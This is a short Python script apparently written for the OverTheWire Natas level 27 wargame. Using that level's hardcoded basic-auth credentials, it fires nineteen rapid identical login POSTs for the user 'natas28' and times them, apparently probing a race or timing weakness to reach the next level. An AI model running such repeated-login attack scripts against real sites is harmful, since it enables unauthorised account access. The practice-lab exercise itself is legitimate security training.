import requests, time, re

CREDS = ("natas27", "55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ")
URL = "http://natas27.natas.labs.overthewire.org/index.php"
POSTDATA = {'username': 'natas28', 'password': 'natas28'}

s = requests.Session()

t1 = time.time()
r01 = s.post(URL, auth=CREDS, data=POSTDATA)
r02 = s.post(URL, auth=CREDS, data=POSTDATA)
r03 = s.post(URL, auth=CREDS, data=POSTDATA)
r04 = s.post(URL, auth=CREDS, data=POSTDATA)
r05 = s.post(URL, auth=CREDS, data=POSTDATA)
r06 = s.post(URL, auth=CREDS, data=POSTDATA)
r07 = s.post(URL, auth=CREDS, data=POSTDATA)
r08 = s.post(URL, auth=CREDS, data=POSTDATA)
r09 = s.post(URL, auth=CREDS, data=POSTDATA)
r10 = s.post(URL, auth=CREDS, data=POSTDATA)
r11 = s.post(URL, auth=CREDS, data=POSTDATA)
r12 = s.post(URL, auth=CREDS, data=POSTDATA)
r13 = s.post(URL, auth=CREDS, data=POSTDATA)
r14 = s.post(URL, auth=CREDS, data=POSTDATA)
r15 = s.post(URL, auth=CREDS, data=POSTDATA)
r16 = s.post(URL, auth=CREDS, data=POSTDATA)
r17 = s.post(URL, auth=CREDS, data=POSTDATA)
r18 = s.post(URL, auth=CREDS, data=POSTDATA)
r19 = s.post(URL, auth=CREDS, data=POSTDATA)
t2 = time.time()
print(time.ctime(t1) + " : " + time.ctime(t2))
